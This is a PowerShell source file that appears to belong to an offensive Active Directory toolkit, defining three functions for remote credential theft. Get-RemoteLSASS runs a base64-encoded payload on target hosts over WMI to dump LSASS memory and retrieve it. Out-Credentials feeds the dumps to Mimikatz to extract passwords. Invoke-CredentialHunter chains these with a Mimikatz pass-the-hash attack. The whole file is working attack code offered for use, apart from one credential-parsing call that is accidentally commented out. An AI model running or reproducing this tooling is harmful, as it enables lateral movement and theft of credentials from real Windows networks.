function Get-RemoteLSASS
{
<#
.SYNOPSIS

Gets a process dump of the LSASS process remotely via WMI as the single communication channel for remote execution and data retrieval.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-RemoteLSASS is ment as a lateral movement tool for credential harvesting. The script first executes a powershell script remotely via WMI, which initiates a memory dump of the LSASS process.
The memory dump is then stored in a custom WMI class as a Base64 encoded string. Finally the custom class is remotely instantiated from the attacker host and the encoded memory dump is retrieved, decoded and stored as a binary file on the local computer again.

The script automatically cleans up files and WMI classes on the target hosts after execution.

.PARAMETER Computer

The hostname of the target computer. This parameter can also be passed by pipeline.

.PARAMETER OutputDirectory

The directory to store the retrieved memory dump(s) to.

.EXAMPLE

Get-RemoteLSASS -Computer "client01.domain.local" -OutputDirectory C:\temp

Description
-----------

This will remotely initiate a process dump of LSASS on the target host "client01.domain.local" and store the dump file locally in "C:\temp".

.LINK

https://github.com/cfalta/ADT


#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Computer,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $OutputDirectory
    )

#This script uses the Begin,Process,End structure custom to powershell. Since the targets can be accepted by pipeline and can therefore also be many at once, this allows for better performance and script structure.

    Begin
    {   
        $AttackSuccessCount = 0
        $AttackFailureCount = 0
        $OverallCount = 0

        #The default payload is based on the "Out-Minidump" function from PowerSploit by Matthew Graeber (@mattifestation).
        #It has been adapted to store the output in a custom WMI class so it can be retrieved via WMI.

        $DefaultPayload = @'

                    function Out-Minidump
            {
             [CmdletBinding()]
                Param (
                    [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
                    [System.Diagnostics.Process]
                    $Process,

                    [Parameter(Position = 1)]
                    [String]
                    $DumpFilePath
                )

                $WER = [PSObject].Assembly.GetType("System.Management.Automation.WindowsErrorReporting")
                $WERNativeMethods = $WER.GetNestedType("NativeMethods", "NonPublic")
                $Flags = [Reflection.BindingFlags] "NonPublic, Static"
                $MiniDumpWriteDump = $WERNativeMethods.GetMethod("MiniDumpWriteDump", $Flags)
                $MiniDumpWithFullMemory = [UInt32] 2

                $ProcessId = $Process.Id
                $ProcessHandle = $Process.Handle

                $FileStream = New-Object IO.FileStream($DumpFilePath, [IO.FileMode]::Create)

                $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle, $ProcessId, $FileStream.SafeFileHandle, $MiniDumpWithFullMemory, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))

                $FileStream.Close()

                if ((-not $Result) -AND (Test-Path $DumpFilePath))
                {
                    Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
                }   
            }
            $DumpFilePath = "C:\Windows\Temp\lsass.dmp"

            Get-Process -Name "LSASS" | Out-Minidump -DumpFilePath $DumpFilePath
            
            #Convert binary process dump file to base64 string
            $DumpFileBytes=[IO.File]::ReadAllBytes($DumpFilePath)
            $EncodedBytes = [Convert]::ToBase64String($DumpFileBytes)

            #Create new WMI class and name it "LSASS_CLASS"
            $Class = [WMIClass]"\\.\root\default"
            $Class["__CLASS"]="LSASS_CLASS"
            
            #Add a class property called F(ile) of type string
            $Class.Properties.Add("F",[Management.CimType]::String,$False)

            #Set "F" and commit changes
            $Class.Properties["F"].Value = $EncodedBytes
            $Class.Put()

            Remove-Item -Path $DumpFilePath
'@

            $WMICommand = ("powershell -E " + [System.Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([System.Management.Automation.ScriptBlock]::Create($DefaultPayload))))
    }
   
    #This is the main processing loop

    Process
    {
        #Set control variables to starting values
        $Timeout = $True
        $RCESuccess = $False
        $LogPrefix = ($Computer + ": ")

        if(($OverallCount % 10) -eq 0)
        {
            Write-Verbose ("#### Targets attacked: " + $OverallCount + " ####")
            $OverallCount++
        }
        else
        {
            $OverallCount++
        }

        #Try to execute the payload remotely
        try
        {
            $WMIResult = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $WMICommand -ComputerName $Computer -ErrorAction Stop
            $RCESuccess = $True
        }
        catch
        {
            Write-Verbose ($LogPrefix + "WMI execution failed.")
            $AttackFailureCount++
        }
        
        #If remote execution succeeded, proceed to acquire the dump
        if($RCESuccess)
        {
            Write-Verbose ($LogPrefix + "WMI execution successful.")
            $NumberOfRetries = 10

            #Construct the remote class path based on the target name and the hard-coded class name "LSASS_CLASS"
            $ClassPath = ('\\' + $Computer + '\root\default:LSASS_CLASS')

            #Wait two seconds because usually the creation of the process dump needs a couple of seconds on the target
            Start-Sleep -Seconds 2

            #Try to acquire the WMI class containing the process dump 10 times, while waiting 2 seconds after each failed attempt
            while($NumberOfRetries -gt 0)
            {
                try
                {
                    $Class = [WMIClass]"$ClassPath"
                    Write-Verbose ($LogPrefix + "Successfully accessed WMI class.")
                    $Timeout = $False
                    $NumberOfRetries = 0
                }
                catch
                {
                    Write-Verbose ($LogPrefix + "Error accessing WMI class. " + $NumberOfRetries + " retries left.")
                    $NumberOfRetries--
                    Start-Sleep -Seconds 2
                }
            }

            #If access to the WMI class is successful, retrieve the encoded dump, decode it and store it as a binary file on the local computer. Delete the WMI class on the target upon completion.
            if(-NOT $Timeout)
            { 
                try
                {
                    $EncodedBytes = $Class.Properties['F'].Value

                    $DumpFilePath = Join-Path $OutputDirectory ($Computer + ".dmp")

                    $DumpFileBytes = [System.Convert]::FromBase64String($EncodedBytes)

                    $DumpFile = [System.IO.File]::WriteAllBytes($DumpFilePath,$DumpFileBytes)
                    
                    $AttackSuccessCount++
                }
                catch
                {
                    Write-Verbose ($LogPrefix + "Error retrieving LSASS dump.")
                    $AttackFailureCount++
                }

                try
                {
                    $Class.Delete()
                }
                catch
                {
                    Write-Verbose ($LogPrefix + "Error deleting WMI class. You may have to clean up manually: " + $ClassPath)
                }
            }
            else
            {
                Write-Verbose ($LogPrefix + "A timeout occured. Retrieval of LSASS dump failed.")
                $AttackFailureCount++
            }
        }

    }

    End 
    {
        Write-Verbose ("Successful: " + $AttackSuccessCount + " Failure: " + $AttackFailureCount)
    }

}

function Out-Credentials
{
<#
.SYNOPSIS

Parses LSASS process dump files using mimikatz and returns credentials.

Author: Christoph Falta (@cfalta)
Required Dependencies: Invoke-Mimikatz (from the Powersploit Suite)

.DESCRIPTION

Out-Credentials executes mimikatz in offline mode on a given number of LSASS process dump files and returns a comprehensive list of credentials.

.PARAMETER DumpFilePath

Path to the directory where the LSASS dump files are stored or to a single dump file.

.PARAMETER DumpFileExtension

By default, "Out-Credentials" will only parse files with a ".dmp" extension. If you want to change this behaviour then use this parameter.

Can be used in conjuction with the "DumpFilePath" parameter if you pass a directory instead of a file.

.PARAMETER OutputDirectory

Path to the output directory where "Out-Credentials" should store the raw credential-information and any other formated output.

.PARAMETER OutStdOut

Can either be True or False. If set to true, a table with results will be printed to standard out.

Default: True

.PARAMETER OutGrid

Can either be True or False. If set to true, powershell will spawn a grid view that can be used to further investigate the results.

Default: False

.PARAMETER OutCSV

Can either be True or False. If set to true, powershell creates a CSV file with the results in it.

Default: False


.EXAMPLE

Out-Credentials -DumpFilePath C:\temp\raw-lsass-dumps

Description
-----------

Out-Credentials looks for all "*.dmp" files in "C:\temp\raw-lsass-dumps" and parses them. A table with usernames and passwords is printed on standard out upon completion.

.EXAMPLE

Out-Credentials -DumpFilePath C:\dumps -DumpFileExtension ".raw" -OutputDirectory C:\out -OutGrid $True -OutCSV $True

Description
-----------

Out-Credentials looks for all "*.raw" files in "C:\dumps" and parses them. A table with usernames and passwords is printed on standard out upon completion and in addition, a CSV file will be created and a GridView will be spawned.

.EXAMPLE

Out-Credentials -DumpFilePath C:\temp\lsass.dmp

Description
-----------

Out-Credentials parses a single dump file "C:\temp\lsass.dmp" and a table with usernames and passwords is printed on standard out upon completion.

.NOTES

This script relies on "Invoke-Mimikatz" from the Powersploit framework

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DumpFilePath,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [String]
        $DumpFileExtension = '.dmp',

        [Parameter()]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $OutputDirectory = (Get-Location),

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [Switch]
        $OutStdOut = $True,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [Switch]
        $OutGrid = $False,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [Switch]
        $OutCSV = $False

    )

    #Check if a single dump file or multiple dump files should be parsed
    $FileOrDirectory = Get-Item -Path $DumpFilePath

    if((($FileOrDirectory.GetType()).Name) -eq "FileInfo")
    {
        $DumpFileObjects = $FileOrDirectory  
    }   
    if((($FileOrDirectory.GetType()).Name) -eq "DirectoryInfo")
    {
        $DumpFileObjects = Get-Childitem -Path $DumpFilePath -Filter ('*' + $DumpFileExtension) | Where {-Not $_.PSIsContainer}
    }

    $EncodedMimikatz = Get-ExternalDependency("Invoke-Mimikatz")

    $MimikatzInit=@"
        `$EncodedMimikatz = "$EncodedMimikatz";
        `$Mimikatz = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64string(`$EncodedMimikatz));
        `$Mimikatz | Invoke-Expression;
"@

    #Start background jobs to parse the dump files. This approach offers better performance when parsing a large number of dump files and also avoids file-lock issues since all dump files stay locked even after mimikatz has finished
    $MimiJobs = @()
    Write-Verbose ("Starting background jobs. Start time: " + (Get-Date))
    foreach($DumpFileObject in $DumpFileObjects)
    {
        $MimiArgs = '"sekurlsa::minidump ' + $DumpFileObject.Fullname + '" "sekurlsa::logonpasswords" "exit"'
        $MimiCMD = "Invoke-Mimikatz -Command `'$MimiArgs`'"

        $MimiCMDComplete = ($MimikatzInit.ToString()) + $MimiCMD

        $Job = Start-Job -ScriptBlock ([System.Management.Automation.ScriptBlock]::Create($MimiCMDComplete))
        $MimiJobs += $Job
    }

    #This loop constantly iterates through all jobs and checks if any of time is still in the "running" state. This is to make sure that all results are available before parsing starts.
    Write-Verbose "Waiting for all jobs to finish"
    $ActiveJobs = $True
    while($ActiveJobs)
    {
        $ActiveJobs = $False

        foreach($Job in $MimiJobs)
        {
            if($Job.State -eq "Running")
            {
                $ActiveJobs = $True
            }
        }
    }

    #Parse each output using "Convert-MimikatzToPSObject" and create an array of custom psobjects
    Write-Verbose ("All background jobs finished. End time: " + (Get-Date))
    Write-Verbose "Starting output parser"
    $Results = @()
    foreach($Job in $MimiJobs)
    {
        $JobOutput = Receive-Job $Job

        #Since "Convert-MimikatzToPSObject" returns an array itself, the final result would be an array of arrays. To avoid this, the output of "Convert-MimikatzToPSObject" is added to the final result array object by object.
        $SingleResult = $JobOutput | Convert-MimikatzToPSObject
        $SingleResult | % { $Results += $_ }
    }
                

    #Depending on the arguments choosen by the user, the output is returned to stdout, exported as a CSV file and display in a graphical grid view
    #Default is printing to stdout
    if($OutCSV)
    {
        $Results | Export-Csv -Path (Join-Path $OutputDirectory 'Credentials.csv')
    }

    if($OutGrid)
    {
        $Results | Out-GridView -Title "Secrets"
    }

    if($OutStdOut)
    {
        $Results | Format-Table
    }

}


function Invoke-CredentialHunter
{
<#
.SYNOPSIS

A wrapper function for "Get-RemoteLSASS" and "Out-Credentials" to simplify Pass-the-Hash attacks.

Author: Christoph Falta (@cfalta)
Required Dependencies: Invoke-Mimikatz, Resolve-Hosts (from the Powersploit Suite)

.DESCRIPTION

Invoke-CredentialHunter is a wrapper function for "Get-RemoteLSASS" and "Out-Credentials" to simplify Pass-the-Hash attacks. The script handles mimikatz invocation, credential dumping on the target and parsing.

For more details see:

man Get-RemoteLSASS
man Out-Credentials

.PARAMETER Target

The target computer to steal credentials from.

.PARAMETER User

The username to use for the PTH attack.

.PARAMETER Domain

The domain the user belongs to.

.PARAMETER Hash

The NTLM hash of the users password.


.EXAMPLE

Invoke-CredentialHunter -Target client01.contoso.com -User Administrator -Domain CLIENT01 -Hash E19CCF75EE54E06B06A5907AF13CEF42 

Description
-----------

Runs Invoke-CredentialHunter against the computer "client01.contoso.com" using the local Administrator account and the hash of the password "P@ssw0rd"

.NOTES
    
This script requires Invoke-Mimikatz from the Powersploit Framework.

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateNotNullorEmpty()]
        [String[]]
        $Target,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $User,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Domain,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Hash
    )

    #Set default values for control variables
    $ScriptRequirements = $True
    #Resolve external dependencies

    $Dependencies = @("Invoke-Mimikatz","Resolve-Hosts")

    foreach($D in $Dependencies)
    {
        $Encoded = Get-ExternalDependency($D)
        [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Encoded)) | Invoke-Expression
    }

    #This function creates a temporary script file to execute. This is necessary because this script will run mimikatz, which in turn will again run powershell, which in turn will execute the actual attack script.
    #To prevent problems with parameter length restrictions, a temporary file is the most stable solution.
    function New-TemporaryScriptFile([string[]]$Targets,[string]$OutputDirectory)
    {
        #Create a random file name
        $TemporaryFilePath = Join-Path $WorkingDirectory (Get-Random -Minimum 100000 -Maximum 999999)

        $CmdletCode = (Get-Command -Name Get-RemoteLSASS).Definition
        $CmdletHeader = "function Get-RemoteLSASS{"
        $CmdletTrailer = "}"

        #Create a target list to store in the temporary script
        $Targets | % { $TargetsAsCSVList += ('"' + $_ + '"' + ',') }
        $TargetsAsDeclaration = '$Targets=@(' + $TargetsAsCSVList.Trim(",") + ')'
        $CmdletCall = ('$Targets | Get-RemoteLSASS -OutputDirectory ' + $OutputDirectory + " -Verbose")

        #Create the file and add the target-specific content to the script
        Add-Content $TemporaryFilePath $CmdletHeader
        Add-Content $TemporaryFilePath $CmdletCode
        Add-Content $TemporaryFilePath $CmdletTrailer
        Add-Content $TemporaryFilePath $TargetsAsDeclaration
        Add-Content $TemporaryFilePath $CmdletCall

        return($TemporaryFilePath)
    }

   
    #The main script executin starts here

    #Check if the user has local admin rights
    if(-Not (Confirm-LocalAdmin))
    {
        Write-Verbose "Local Admin rights are needed. Please elevate powershell and try again."
        $ScriptRequirements = $False
    }

    #If all requirements are met, continue execution
    if($ScriptRequirements)
    {
        #Get current directroy
        $StartDirectory = Get-Location
        #Create working directory
        $WorkingDirectory = New-WorkingDirectory

        #Initialize target list
        $Targetlist = @()
    
        #Resolve target hosts using Resolve-Hosts
        foreach($SingleTarget in $Target)
        {
            $Targetlist += Resolve-Hosts($SingleTarget)
        }

        #Create a temporary script file based on the target list
        $TemporaryScriptFile = New-TemporaryScriptFile $Targetlist $WorkingDirectory

        #Construct mimikatz run argument and base64 encode it
        $MimiCMDPart1 = "powershell.exe -E "
        $MimiCMDPart2 = "Get-Content -raw " + $TemporaryScriptFile + " | Invoke-Expression"
        $MimiCMD = $MimiCMDPart1 + [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes([System.Management.Automation.ScriptBlock]::Create($MimiCMDPart2)))

        #Construct complete mimikatz argument string
        $MimiArgs = '"privilege::debug" "sekurlsa::pth /user:' + $User + ' /domain:' + $Domain + ' /ntlm:' + $Hash + ' /run:\"' + $MimiCMD + '\""' + ' "exit"'

        #Execute mimikatz via Invoke-Mimikatz
        Write-Verbose ("Number of targets: " + $Targetlist.Count)
        Write-Verbose "Executing mimikatz, please check the other powershell window for more details."
        $MimiResult = Invoke-Mimikatz -Command $MimiArgs -Verbose:$False

        #Parse the output to find the ID of the spawned mimikatz process
        $MimiResultParsed = $MimiResult | Select-String -Pattern "PID.*" -AllMatches
        if($MimiResultParsed.Matches.Count -eq 1)
        {
            #Extract PID and get the process object
            $MimiPID = $MimiResultParsed.Matches.Value.Trim("PID").Trim(" ")
            $MimiProcess = Get-Process -Id $MimiPID

            Write-Verbose ("Waiting on mimikatz process " + $MimiPID + " to exit. Start time: " + (Get-Date))

            while(-NOT $MimiProcess.hasexited)
            {
                Start-Sleep -Seconds 5
            }
            
            Write-Verbose ("Mimikatz process finished execution. End time: " + (Get-Date)) 
            #Extract credentials from dump file            Out-Credentials -DumpFilePath $WorkingDirectory -OutputDirectory $StartDirectory -OutCSV
             
        }
        else
        {
            Write-Verbose "Error during mimikatz execution. The output is: $MimiResult"
        }

        #Remove workingdirectory and temporary files
        Remove-WorkingDirectory($WorkingDirectory)
    }
}